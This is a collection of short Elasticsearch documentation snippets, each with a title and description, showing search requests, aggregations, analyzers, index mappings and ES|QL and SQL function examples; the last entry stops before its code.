TITLE: Date Range Aggregation with Time Zone
DESCRIPTION: Illustrates time zone handling in date range aggregations using either ISO 8601 UTC offset or TZ database IDs. Demonstrates date conversion and rounding in the specified time zone.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
   "aggs": {
       "range": {
           "date_range": {
               "field": "date",
               "time_zone": "CET",
               "ranges": [
                  { "to": "2016/02/01" },
                  { "from": "2016/02/01", "to" : "now/d" },
                  { "from": "now/d" }
              ]
          }
      }
   }
}

----------------------------------------

TITLE: Fuzzy Title Search using QSTR in ESQL
DESCRIPTION: Shows fuzzy text search for books with title similar to 'Hobbit' using QSTR function with fuzziness parameter set to 2. Returns book numbers and titles, sorted by book number and limited to 5 results.

LANGUAGE: esql
CODE:
FROM books
| WHERE QSTR("title: Hobbjt~", {"fuzziness": 2})
| KEEP book_no, title
| SORT book_no
| LIMIT 5

----------------------------------------

TITLE: Configuring Field Similarity in Elasticsearch Index Mapping
DESCRIPTION: Example showing how to configure different similarity algorithms for text fields when creating an Elasticsearch index. Demonstrates setting default BM25 similarity and custom boolean similarity on different fields.

LANGUAGE: json
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "default_field": {
        "type": "text"
      },
      "boolean_sim_field": {
        "type": "text",
        "similarity": "boolean"
      }
    }
  }
}

----------------------------------------

TITLE: Retrieving Authenticated User with USER() Function in Elasticsearch SQL
DESCRIPTION: The USER() function returns the username of the currently authenticated user executing the query. Takes no input parameters and returns a string value. May return null if security is disabled.

LANGUAGE: sql
CODE:
USER()

LANGUAGE: sql
CODE:
SELECT USER();

     USER
---------------
elastic

----------------------------------------

TITLE: Filtering Data with LIKE Operator in Elasticsearch SQL
DESCRIPTION: Demonstrates how to use the LIKE operator with wildcards to filter employee names. The query filters first names that start with any single character followed by 'b' and any number of characters after that. Uses '?' for single character matching and '*' for multiple character matching.

LANGUAGE: sql
CODE:
FROM employees
| WHERE first_name LIKE """?b*"""
| KEEP first_name, last_name

----------------------------------------

TITLE: Basic Percentiles Aggregation in Elasticsearch
DESCRIPTION: Demonstrates basic usage of percentiles aggregation to calculate default percentile ranges [1, 5, 25, 50, 75, 95, 99] on a numeric field.

LANGUAGE: console
CODE:
GET latency/_search
{
  "size": 0,
  "aggs": {
    "load_time_outlier": {
      "percentiles": {
        "field": "load_time"
      }
    }
  }
}

----------------------------------------

TITLE: Executing Rare Terms Aggregation in Elasticsearch
DESCRIPTION: Shows how to execute a rare terms aggregation on the 'genre' field in an Elasticsearch query, returning terms that appear in only one document.

LANGUAGE: console
CODE:
GET /_search
{
  "aggs": {
    "genres": {
      "rare_terms": {
        "field": "genre"
      }
    }
  }
}

----------------------------------------

TITLE: Basic Filters Aggregation in Elasticsearch
DESCRIPTION: Demonstrates how to create a basic filters aggregation that separates documents into buckets based on error and warning matches in log messages.

LANGUAGE: console
CODE:
PUT /logs/_bulk?refresh
{ "index" : { "_id" : 1 } }
{ "body" : "warning: page could not be rendered" }
{ "index" : { "_id" : 2 } }
{ "body" : "authentication error" }
{ "index" : { "_id" : 3 } }
{ "body" : "warning: connection timed out" }

GET logs/_search
{
  "size": 0,
  "aggs" : {
    "messages" : {
      "filters" : {
        "filters" : {
          "errors" :   { "match" : { "body" : "error"   }},
          "warnings" : { "match" : { "body" : "warning" }}
        }
      }
    }
  }
}

----------------------------------------

TITLE: String Replacement using REPLACE Function in Elasticsearch SQL
DESCRIPTION: Demonstrates how to use the REPLACE function to substitute text matching a regular expression pattern with a new string. The example shows replacing 'World' with 'Universe' in the string 'Hello World'.

LANGUAGE: sql
CODE:
ROW str = "Hello World"
| EVAL str = REPLACE(str, "World", "Universe")
| KEEP str

----------------------------------------

TITLE: Using CATEGORIZE Function in Elasticsearch SQL
DESCRIPTION: Example query demonstrating how to use the CATEGORIZE function to group similar text messages and count their occurrences. The function analyzes the 'message' field and groups records with similar text patterns into categories.

LANGUAGE: sql
CODE:
FROM sample_data
| STATS count=COUNT() BY category=CATEGORIZE(message)

----------------------------------------

TITLE: Using BUCKET Function in ESQL Query
DESCRIPTION: This query demonstrates the use of the BUCKET function to group hire dates into 20 buckets over a one-year period. It selects employees hired in 1985, groups them by month using BUCKET, and sorts the results.

LANGUAGE: sql
CODE:
FROM employees
| WHERE hire_date >= "1985-01-01T00:00:00Z" AND hire_date < "1986-01-01T00:00:00Z"
| STATS hire_date = MV_SORT(VALUES(hire_date)) BY month = BUCKET(hire_date, 20, "1985-01-01T00:00:00Z", "1986-01-01T00:00:00Z")
| SORT hire_date

----------------------------------------

TITLE: Mapping a Text Field in Elasticsearch
DESCRIPTION: Example of creating an index with a 'text' field named 'full_name'.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "full_name": {
        "type":  "text"
      }
    }
  }
}

----------------------------------------

TITLE: Field Existence Query in KQL
DESCRIPTION: Query syntax to filter documents where a specific field exists using the * operator.

LANGUAGE: yaml
CODE:
http.request.method: *

----------------------------------------

TITLE: Working with Basic Multivalued Fields in ESQL
DESCRIPTION: Demonstrates how ESQL handles basic multivalued fields with arrays. Shows bulk indexing and querying of documents with single and multivalued fields.

LANGUAGE: console
CODE:
POST /mv/_bulk?refresh
{ "index" : {} }
{ "a": 1, "b": [2, 1] }
{ "index" : {} }
{ "a": 2, "b": 3 }

POST /_query
{
  "query": "FROM mv | LIMIT 2"
}

----------------------------------------

TITLE: Customizing Length Token Filter in Elasticsearch
DESCRIPTION: Example of creating a custom length filter that removes tokens shorter than 2 characters and longer than 10 characters, incorporating it into a custom analyzer.

LANGUAGE: console
CODE:
PUT length_custom_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "whitespace_length_2_to_10_char": {
          "tokenizer": "whitespace",
          "filter": [ "length_2_to_10_char" ]
        }
      },
      "filter": {
        "length_2_to_10_char": {
          "type": "length",
          "min": 2,
          "max": 10
        }
      }
    }
  }
}

----------------------------------------

TITLE: Range Queries in KQL
DESCRIPTION: Syntax for filtering documents based on numeric, date, or string ranges using comparison operators.

LANGUAGE: yaml
CODE:
http.response.bytes < 10000

LANGUAGE: yaml
CODE:
http.response.bytes > 10000 and http.response.bytes <= 20000

LANGUAGE: yaml
CODE:
@timestamp < now-2w

----------------------------------------

TITLE: Executing Pinned Query in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the pinned query to promote specific documents by their IDs while also including an organic match query. It uses the GET /_search endpoint with a JSON body containing the query structure.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "pinned": {
      "ids": [ "1", "4", "100" ],
      "organic": {
        "match": {
          "description": "iphone"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Rebuilding Fingerprint Analyzer as Custom Analyzer in Elasticsearch
DESCRIPTION: This snippet demonstrates how to recreate the built-in fingerprint analyzer as a custom analyzer. It provides a starting point for further customization by explicitly defining the tokenizer and token filters.

LANGUAGE: json
CODE:
PUT /fingerprint_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "rebuilt_fingerprint": {
          "tokenizer": "standard",
          "filter": [
            "lowercase",
            "asciifolding",
            "fingerprint"
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Running Aggregations on Aggregate Metric Double Field in Elasticsearch
DESCRIPTION: This example shows how to perform various metric aggregations (min, max, sum, value_count, and avg) on an aggregate_metric_double field in Elasticsearch. The aggregations are run on the 'agg_metric' field.

LANGUAGE: console
CODE:
POST stats-index/_search?size=0
{
  "aggs": {
    "metric_min": { "min": { "field": "agg_metric" } },
    "metric_max": { "max": { "field": "agg_metric" } },
    "metric_value_count": { "value_count": { "field": "agg_metric" } },
    "metric_sum": { "sum": { "field": "agg_metric" } },
    "metric_avg": { "avg": { "field": "agg_metric" } }
  }
}

----------------------------------------

TITLE: ESQL Number Parameter Documentation
DESCRIPTION: Specification for a number parameter input that can accept single or multi-valued columns or expressions.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`number`
:   Input value. The input can be a single- or multi-valued column or an expression.

----------------------------------------

TITLE: Java Code Sample
DESCRIPTION: Sample Java import statement for pattern capture analysis demonstration.

LANGUAGE: java
CODE:
import static org.apache.commons.lang.StringEscapeUtils.escapeHtml

----------------------------------------

TITLE: Basic Significant Text Aggregation Query in Elasticsearch
DESCRIPTION: This snippet demonstrates a basic use case of the significant text aggregation, searching for documents related to 'Bird flu' and identifying statistically significant terms in the content field.

LANGUAGE: console
CODE:
GET news/_search
{
  "query": {
    "match": { "content": "Bird flu" }
  },
  "aggregations": {
    "my_sample": {
      "sampler": {
        "shard_size": 100
      },
      "aggregations": {
        "keywords": {
          "significant_text": { "field": "content" }
        }
      }
    }
  }
}

----------------------------------------

TITLE: SQL DESCRIBE TABLE Example Output
DESCRIPTION: Shows an example output of the DESCRIBE command for an 'emp' table, displaying column names, their SQL types, and corresponding Elasticsearch field mappings.

LANGUAGE: sql
CODE:
DESCRIBE emp;

       column       |     type      |    mapping
--------------------+---------------+---------------
birth_date          |TIMESTAMP      |datetime
dep                 |STRUCT         |nested
dep.dep_id          |VARCHAR        |keyword
dep.dep_name        |VARCHAR        |text
dep.dep_name.keyword|VARCHAR        |keyword
dep.from_date       |TIMESTAMP      |datetime
dep.to_date         |TIMESTAMP      |datetime
emp_no              |INTEGER        |integer
first_name          |VARCHAR        |text
first_name.keyword  |VARCHAR        |keyword
gender              |VARCHAR        |keyword
hire_date           |TIMESTAMP      |datetime
languages           |TINYINT        |byte
last_name           |VARCHAR        |text
last_name.keyword   |VARCHAR        |keyword
name                |VARCHAR        |keyword
salary              |INTEGER        |integer

----------------------------------------

TITLE: Configuring and Using Rank Feature Fields in Elasticsearch
DESCRIPTION: Demonstrates how to configure rank_feature fields in an index mapping and use them for document indexing and searching. Shows both positive and negative score impact configurations, with examples of indexing documents and performing basic rank_feature queries.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "pagerank": {
        "type": "rank_feature"
      },
      "url_length": {
        "type": "rank_feature",
        "positive_score_impact": false
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "pagerank": 8,
  "url_length": 22
}

GET my-index-000001/_search
{
  "query": {
    "rank_feature": {
      "field": "pagerank"
    }
  }
}

----------------------------------------

TITLE: Basic Grok Pattern Matching in Elasticsearch Pipeline
DESCRIPTION: Example showing how to use the Grok processor to extract structured fields from a log message using predefined patterns. Demonstrates extraction of IP address, HTTP method, request path, and numeric values.

LANGUAGE: console
CODE:
POST _ingest/pipeline/_simulate
{
  "pipeline": {
    "description" : "...",
    "processors": [
      {
        "grok": {
          "field": "message",
          "patterns": ["%{IP:client} %{WORD:method} %{URIPATHPARAM:request} %{NUMBER:bytes:int} %{NUMBER:duration:double}"]
        }
      }
    ]
  },
  "docs":[
    {
      "_source": {
        "message": "55.3.244.1 GET /index.html 15824 0.043"
      }
    }
  ]
}

----------------------------------------

TITLE: Calculating Geographic Extent with ST_EXTENT_AGG in ESQL
DESCRIPTION: This ESQL query filters airports in India and calculates the geographic extent (bounding box) of their locations using the ST_EXTENT_AGG function. The result is a single geo_shape representing the overall extent of the filtered locations.

LANGUAGE: esql
CODE:
FROM airports
| WHERE country == "India"
| STATS extent = ST_EXTENT_AGG(location)

----------------------------------------

TITLE: Expanding Collapsed Results with Inner Hits
DESCRIPTION: Shows how to expand collapsed results using inner hits option, allowing retrieval of multiple documents per collapse key with custom sorting and size parameters.

LANGUAGE: console
CODE:
GET /my-index-000001/_search
{
  "query": {
    "match": {
      "message": "GET /search"
    }
  },
  "collapse": {
    "field": "user.id",
    "inner_hits": {
      "name": "most_recent",
      "size": 5,
      "sort": [ { "@timestamp": "desc" } ]
    },
    "max_concurrent_group_searches": 4
  },
  "sort": [
    {
      "http.response.bytes": {
        "order": "desc"
      }
    }
  ]
}

----------------------------------------

TITLE: Configuring Join Field Mapping in Elasticsearch
DESCRIPTION: Sets up an index with a join field mapping to enable parent-child relationships between documents. The mapping defines a parent-child relation named 'parent' to 'child'.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "mappings": {
    "properties": {
      "my-join-field": {
        "type": "join",
        "relations": {
          "parent": "child"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Field Metadata in Elasticsearch Mapping
DESCRIPTION: This snippet demonstrates how to add metadata to a field in an Elasticsearch index mapping. It creates an index with a 'latency' field of type 'long' and attaches metadata indicating the unit of measurement.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "latency": {
        "type": "long",
        "meta": {
          "unit": "ms"
        }
      }
    }
  }
}

----------------------------------------

TITLE: SQL COALESCE Function
DESCRIPTION: Returns the first non-null value from a list of expressions. Takes multiple arguments and evaluates them in order until finding a non-null value.

LANGUAGE: sql
CODE:
COALESCE(
    expression,
    expression,
    ...)

----------------------------------------

TITLE: Customizing Edge N-gram Filter in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create a custom edge_ngram filter that forms n-grams between 3-5 characters and incorporates it into a custom analyzer.

LANGUAGE: console
CODE:
PUT edge_ngram_custom_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "default": {
          "tokenizer": "whitespace",
          "filter": [ "3_5_edgegrams" ]
        }
      },
      "filter": {
        "3_5_edgegrams": {
          "type": "edge_ngram",
          "min_gram": 3,
          "max_gram": 5
        }
      }
    }
  }
}

----------------------------------------

TITLE: Basic Match Phrase Query in Elasticsearch
DESCRIPTION: Demonstrates a simple match_phrase query to search for an exact phrase in the message field. The query analyzes the text and creates a phrase query from the analyzed text.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "match_phrase": {
      "message": "this is a test"
    }
  }
}

----------------------------------------

TITLE: Formatting Dates in ESQL Query
DESCRIPTION: Query that selects employee data and formats hire_date field into yyyy-MM-dd format. Uses KEEP to select specific columns and EVAL to create a new formatted date column.

LANGUAGE: esql
CODE:
FROM employees
| KEEP first_name, last_name, hire_date
| EVAL hired = DATE_FORMAT("yyyy-MM-dd", hire_date)

----------------------------------------

TITLE: ELSER Semantic Search Query in Elasticsearch
DESCRIPTION: This snippet demonstrates a sparse vector query using the ELSER model for semantic search. It specifies the field, inference ID, and query string.

LANGUAGE: json
CODE:
{
   "query":{
      "sparse_vector": {
         "field": "ml.tokens",
         "inference_id": "my-elser-model",
         "query": "How is the weather in Jamaica?"
      }
   }
}

----------------------------------------

TITLE: Defining Multivalue Expression Parameter in ESQL Test
DESCRIPTION: This snippet defines a 'field' parameter for an ESQL test case. The field is described as a multivalue expression, which is likely used in testing ESQL functions that operate on multiple values.

LANGUAGE: markdown
CODE:
`field`
:   Multivalue expression.

----------------------------------------

TITLE: Calculating Distance Between Points in Elasticsearch SQL
DESCRIPTION: The ST_Distance function calculates the distance between two geometries in meters. Both inputs must be point geometries. It returns a double value.

LANGUAGE: sql
CODE:
SELECT ST_Distance(ST_WKTToSQL('POINT (10 20)'), ST_WKTToSQL('POINT (20 30)')) distance;

----------------------------------------

TITLE: Basic Pagination with From/Size Parameters
DESCRIPTION: Example of basic pagination using from and size parameters to skip and limit results. The from parameter defines hits to skip (default 0) and size sets maximum hits to return.

LANGUAGE: console
CODE:
GET /_search
{
  "from": 5,
  "size": 20,
  "query": {
    "match": {
      "user.id": "kimchy"
    }
  }
}

----------------------------------------

TITLE: Converting Strings to IP Addresses and CIDR Matching in ESQL
DESCRIPTION: This snippet demonstrates the use of TO_IP function to convert strings to IP addresses and CIDR_MATCH function to check if an IP address falls within a specified CIDR range. It also shows how null values are handled for invalid conversions.

LANGUAGE: esql
CODE:
ROW str1 = "1.1.1.1", str2 = "foo"
| EVAL ip1 = TO_IP(str1), ip2 = TO_IP(str2)
| WHERE CIDR_MATCH(ip1, "1.0.0.0/8")

----------------------------------------

TITLE: Calculating Maximum Value in Elasticsearch SQL
DESCRIPTION: Returns the maximum value across input values in a field using the MAX function.

LANGUAGE: sql
CODE:
SELECT MAX(salary) AS max FROM emp;

LANGUAGE: sql
CODE:
SELECT MAX(ABS(salary / -12.0)) AS max FROM emp;

----------------------------------------

TITLE: Analyzing Text with Custom Mapping Character Filter in Elasticsearch
DESCRIPTION: This example uses a custom 'mapping' character filter to replace an emoticon with its text equivalent. It demonstrates how to apply a custom filter to a specific text string for analysis.

LANGUAGE: json
CODE:
GET /my-index-000001/_analyze
{
  "tokenizer": "keyword",
  "char_filter": [ "my_mappings_char_filter" ],
  "text": "I'm delighted about it :("
}

----------------------------------------

TITLE: Analyzing Text with Trim Filter
DESCRIPTION: Example showing how to use the analyze API with both keyword tokenizer and trim filter to remove leading and trailing whitespace from tokens.

LANGUAGE: console
CODE:
GET _analyze
{
  "tokenizer" : "keyword",
  "filter" : ["trim"],
  "text" : " fox "
}

----------------------------------------

TITLE: Executing Has Child Query in Elasticsearch
DESCRIPTION: Demonstrates a has_child query that matches parent documents based on child document criteria. Includes parameters for controlling the number of matching children and score calculation mode.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "has_child": {
      "type": "child",
      "query": {
        "match_all": {}
      },
      "max_children": 10,
      "min_children": 2,
      "score_mode": "min"
    }
  }
}

----------------------------------------

TITLE: Executing Scripted Metric Aggregation in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the scripted metric aggregation to compute the total profit from sale and cost transactions. It includes init, map, combine, and reduce scripts.

LANGUAGE: console
CODE:
POST ledger/_search?size=0
{
  "query": {
    "match_all": {}
  },
  "aggs": {
    "profit": {
      "scripted_metric": {
        "init_script": "state.transactions = []",
        "map_script": "state.transactions.add(doc.type.value == 'sale' ? doc.amount.value : -1 * doc.amount.value)",
        "combine_script": "double profit = 0; for (t in state.transactions) { profit += t } return profit",
        "reduce_script": "double profit = 0; for (a in states) { profit += a } return profit"
      }
    }
  }
}

----------------------------------------

TITLE: Combined Sparse Vector and Multi-Match Query in Elasticsearch
DESCRIPTION: This example combines multiple sparse vector queries with a multi-match query using boolean query clauses and linear boosting for more comprehensive search results.

LANGUAGE: json
CODE:
{
  "query": {
    "bool": {
      "should": [
        {
          "sparse_vector": {
            "field": "ml.inference.title_expanded.predicted_value",
            "inference_id": "my-elser-model",
            "query": "How is the weather in Jamaica?",
            "boost": 1
          }
        },
        {
          "sparse_vector": {
            "field": "ml.inference.description_expanded.predicted_value",
            "inference_id": "my-elser-model",
            "query": "How is the weather in Jamaica?",
            "boost": 1
          }
        },
        {
          "multi_match": {
            "query": "How is the weather in Jamaica?",
            "fields": [
              "title",
              "description"
            ],
            "boost": 4
          }
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Configuring Custom Fingerprint Analyzer in Elasticsearch
DESCRIPTION: This example shows how to create a custom fingerprint analyzer with English stop words. It includes the index creation with analyzer settings and a sample analysis request.

LANGUAGE: json
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_fingerprint_analyzer": {
          "type": "fingerprint",
          "stopwords": "_english_"
        }
      }
    }
  }
}

POST my-index-000001/_analyze
{
  "analyzer": "my_fingerprint_analyzer",
  "text": "Yes yes, Gödel said this sentence is consistent and."
}

----------------------------------------

TITLE: Calculating Bit Length of City Names in ESQL
DESCRIPTION: This ESQL query selects cities in India from an airports dataset, then calculates both the character length and bit length of each city name. It demonstrates the use of the BIT_LENGTH function alongside the LENGTH function for comparison.

LANGUAGE: sql
CODE:
FROM airports
| WHERE country == "India"
| KEEP city
| EVAL fn_length = LENGTH(city), fn_bit_length = BIT_LENGTH(city)

----------------------------------------

TITLE: Adding More Dynamic Fields to Existing Index in Elasticsearch
DESCRIPTION: This example shows how to add additional fields to an existing index dynamically, including a new field within a nested object.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/2
{
  "username": "marywhite",
  "email": "mary@white.com",
  "name": {
    "first": "Mary",
    "middle": "Alice",
    "last": "White"
  }
}

GET my-index-000001/_mapping

----------------------------------------

TITLE: Complete Boxplot Search Query Example
DESCRIPTION: Demonstrates a complete search query implementing boxplot aggregation, including size parameter and aggregation naming. The field must be numeric.

LANGUAGE: console
CODE:
GET latency/_search
{
  "size": 0,
  "aggs": {
    "load_time_boxplot": {
      "boxplot": {
        "field": "load_time"
      }
    }
  }
}

----------------------------------------

TITLE: Basic Field Collapsing in Elasticsearch
DESCRIPTION: Demonstrates how to collapse search results based on user.id field and sort by http.response.bytes. The collapse parameter selects only the top sorted document per collapse key.

LANGUAGE: console
CODE:
GET my-index-000001/_search
{
  "query": {
    "match": {
      "message": "GET /search"
    }
  },
  "collapse": {
    "field": "user.id"
  },
  "sort": [
    {
      "http.response.bytes": {
        "order": "desc"
      }
    }
  ],
  "from": 0
}

----------------------------------------

TITLE: Basic N-gram Tokenizer Analysis in Elasticsearch
DESCRIPTION: Example of using the default N-gram tokenizer settings which processes text with min_gram=1 and max_gram=2

LANGUAGE: console
CODE:
POST _analyze
{
  "tokenizer": "ngram",
  "text": "Quick Fox"
}

LANGUAGE: text
CODE:
[ Q, Qu, u, ui, i, ic, c, ck, k, "k ", " ", " F", F, Fo, o, ox, x ]

----------------------------------------

TITLE: Basic Path Hierarchy Tokenizer Example
DESCRIPTION: Demonstrates basic usage of the path_hierarchy tokenizer by analyzing a simple path string.

LANGUAGE: console
CODE:
POST _analyze
{
  "tokenizer": "path_hierarchy",
  "text": "/one/two/three"
}

LANGUAGE: text
CODE:
[ /one, /one/two, /one/two/three ]

----------------------------------------

TITLE: Using UCASE Function in Elasticsearch SQL
DESCRIPTION: Converts all lowercase characters in the input string to uppercase.

LANGUAGE: sql
CODE:
SELECT UCASE('Elastic');

UCASE('Elastic')
----------------
ELASTIC

----------------------------------------

TITLE: Configuring Multi-Field Index Sorting in Elasticsearch
DESCRIPTION: Example demonstrating how to sort an index by multiple fields (username and date) with different sort orders. Shows advanced index sort configuration with multiple fields and orders.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "index": {
      "sort.field": [ "username", "date" ],
      "sort.order": [ "asc", "desc" ]
    }
  },
  "mappings": {
    "properties": {
      "username": {
        "type": "keyword",
        "doc_values": true
      },
      "date": {
        "type": "date"
      }
    }
  }
}

----------------------------------------

TITLE: Calculating Logarithm with Custom Base in ESQL
DESCRIPTION: Demonstrates using the LOG function with two parameters to calculate the logarithm of a value with a specified base. Shows how to find the logarithm of 8.0 with base 2.0, which results in 3.0.

LANGUAGE: esql
CODE:
ROW base = 2.0, value = 8.0
| EVAL s = LOG(base, value)

----------------------------------------

TITLE: Retrieving Specific Fields Using 'fields' Parameter in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the 'fields' parameter in an Elasticsearch search request to retrieve specific fields. It includes examples of using wildcards and custom date formatting.

LANGUAGE: console
CODE:
POST my-index-000001/_search
{
  "query": {
    "match": {
      "user.id": "kimchy"
    }
  },
  "fields": [
    "user.id",
    "http.response.*",
    {
      "field": "@timestamp",
      "format": "epoch_millis"
    }
  ],
  "_source": false
}

----------------------------------------

TITLE: Configuring Attachment Processor Pipeline in Elasticsearch
DESCRIPTION: Demonstrates how to create an ingest pipeline with the attachment processor to extract file information.

LANGUAGE: console
CODE:
PUT _ingest/pipeline/attachment
{
  "description" : "Extract attachment information",
  "processors" : [
    {
      "attachment" : {
        "field" : "data",
        "remove_binary": true
      }
    }
  ]
}

----------------------------------------

TITLE: Calculating Weighted Sum Using MV_PSERIES_WEIGHTED_SUM in ESQL
DESCRIPTION: Demonstrates how to use MV_PSERIES_WEIGHTED_SUM to calculate a weighted sum of array values with a decay factor. The function applies a weight of 1.5 to the array [70.0, 45.0, 21.0, 21.0, 21.0] and returns the weighted sum result.

LANGUAGE: esql
CODE:
ROW a = [70.0, 45.0, 21.0, 21.0, 21.0]
| EVAL sum = MV_PSERIES_WEIGHTED_SUM(a, 1.5)
| KEEP sum

----------------------------------------

TITLE: Defining ESQL Function Test Case Parameters in YAML
DESCRIPTION: Specifies the parameters for an ESQL function test case, including a 'number' parameter that accepts a multivalue expression.

LANGUAGE: yaml
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`number`
:   Multivalue expression.

----------------------------------------

TITLE: Script Query with Custom Parameters
DESCRIPTION: Illustrates how to use custom parameters in script queries for better caching and performance. Parameters are passed through the params object in the script configuration.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "bool": {
      "filter": {
        "script": {
          "script": {
            "source": "doc['num1'].value > params.param1",
            "lang": "painless",
            "params": {
              "param1": 5
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Synthetic Source Example with Long Type
DESCRIPTION: Demonstrates how to configure and use synthetic _source with long numeric type, showing how values are sorted in the output.

LANGUAGE: console
CODE:
PUT idx
{
  "settings": {
    "index": {
      "mapping": {
        "source": {
          "mode": "synthetic"
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "long": { "type": "long" }
    }
  }
}
PUT idx/_doc/1
{
  "long": [0, 0, -123466, 87612]
}

----------------------------------------

TITLE: Calculating Median of Odd-Length Array in ESQL
DESCRIPTION: This snippet demonstrates how to use the MV_MEDIAN function to calculate the median of an array with an odd number of integer values. The function returns the middle value when sorted.

LANGUAGE: esql
CODE:
ROW a=[3, 5, 1]
| EVAL median_a = MV_MEDIAN(a)

----------------------------------------

TITLE: Creating Custom Analyzer with Hyphenation Decompounder
DESCRIPTION: Example of creating a custom analyzer using the hyphenation_decompounder filter with specific configuration for word list, hyphenation patterns, and maximum subword size.

LANGUAGE: console
CODE:
PUT hyphenation_decompound_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "standard_hyphenation_decompound": {
          "tokenizer": "standard",
          "filter": [ "22_char_hyphenation_decompound" ]
        }
      },
      "filter": {
        "22_char_hyphenation_decompound": {
          "type": "hyphenation_decompounder",
          "word_list_path": "analysis/example_word_list.txt",
          "hyphenation_patterns_path": "analysis/hyphenation_patterns.xml",
          "max_subword_size": 22
        }
      }
    }
  }
}

----------------------------------------

TITLE: Analyzing Text with Delimited Payload Filter in Elasticsearch
DESCRIPTION: This example uses the analyze API to demonstrate how the delimited_payload filter splits tokens and payloads using the default '|' delimiter.

LANGUAGE: console
CODE:
GET _analyze
{
  "tokenizer": "whitespace",
  "filter": ["delimited_payload"],
  "text": "the|0 brown|10 fox|5 is|0 quick|10"
}

----------------------------------------

TITLE: Using BETWEEN Operator in Elasticsearch SQL
DESCRIPTION: Demonstrates the BETWEEN operator for selecting records within a range of values.

LANGUAGE: sql
CODE:
SELECT last_name l FROM "test_emp" WHERE emp_no BETWEEN 9990 AND 10003 ORDER BY emp_no;

----------------------------------------

TITLE: Analyzing Text with Pattern Replace Filter in Elasticsearch
DESCRIPTION: Example of using the pattern_replace filter to prepend 'watch' to the substring 'dog' in a text string using the analyze API. The filter uses a regex pattern with capture groups.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "whitespace",
  "filter": [
    {
      "type": "pattern_replace",
      "pattern": "(dog)",
      "replacement": "watch$1"
    }
  ],
  "text": "foxes jump lazy dogs"
}

LANGUAGE: text
CODE:
[ foxes, jump, lazy, watchdogs ]

----------------------------------------

TITLE: Creating ServiceNow Connector via Elasticsearch API
DESCRIPTION: API call to create a new ServiceNow connector with basic configuration

LANGUAGE: console
CODE:
PUT _connector/my-servicenow-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from ServiceNow",
  "service_type": "servicenow"
}

----------------------------------------

TITLE: Mixed Document and Text MLT Query
DESCRIPTION: Advanced example showing how to combine existing index documents with free text in a more_like_this query using Multi GET API syntax.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "more_like_this": {
      "fields": [ "title", "description" ],
      "like": [
        {
          "_index": "imdb",
          "_id": "1"
        },
        {
          "_index": "imdb",
          "_id": "2"
        },
        "and potentially some more text here as well"
      ],
      "min_term_freq": 1,
      "max_query_terms": 12
    }
  }
}

----------------------------------------

TITLE: Calculating Hyperbolic Cosine Using COSH Function in ESQL
DESCRIPTION: This snippet demonstrates how to use the COSH function in ESQL to calculate the hyperbolic cosine of a given value. It creates a row with a single double value and applies the COSH function to it.

LANGUAGE: esql
CODE:
ROW a=1.8
| EVAL cosh=COSH(a)

----------------------------------------

TITLE: Creating Index with Rank Feature Mappings
DESCRIPTION: Sets up an Elasticsearch index with rank_feature and rank_features field mappings for pagerank, url_length and topics.

LANGUAGE: console
CODE:
PUT /test
{
  "mappings": {
    "properties": {
      "pagerank": {
        "type": "rank_feature"
      },
      "url_length": {
        "type": "rank_feature",
        "positive_score_impact": false
      },
      "topics": {
        "type": "rank_features"
      }
    }
  }
}

----------------------------------------

TITLE: Querying Airports with Geospatial Filtering in Elasticsearch ESQL
DESCRIPTION: This ESQL query filters airports that intersect with a specified polygon area. It uses the ST_INTERSECTS function to compare the airport's location with a polygon defined using the TO_GEOSHAPE function.

LANGUAGE: esql
CODE:
FROM airports
| WHERE ST_INTERSECTS(location, TO_GEOSHAPE("POLYGON((42 14, 43 14, 43 15, 42 15, 42 14))"))

----------------------------------------

TITLE: Basic Range Query Example
DESCRIPTION: Demonstrates a basic range query that searches for documents where the 'age' field contains values between 10 and 20, with a boost of 2.0.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "range": {
      "age": {
        "gte": 10,
        "lte": 20,
        "boost": 2.0
      }
    }
  }
}

----------------------------------------

TITLE: Basic MEDIAN and MEDIAN_ABSOLUTE_DEVIATION Calculation in ESQL
DESCRIPTION: Demonstrates how to calculate both median and median absolute deviation of salary data from an employees table. Returns two columns showing the median salary and its deviation.

LANGUAGE: esql
CODE:
FROM employees
| STATS MEDIAN(salary), MEDIAN_ABSOLUTE_DEVIATION(salary)

----------------------------------------

TITLE: Basic Date Histogram Calendar Interval Example
DESCRIPTION: Example showing how to create a date histogram aggregation using monthly calendar intervals.

LANGUAGE: console
CODE:
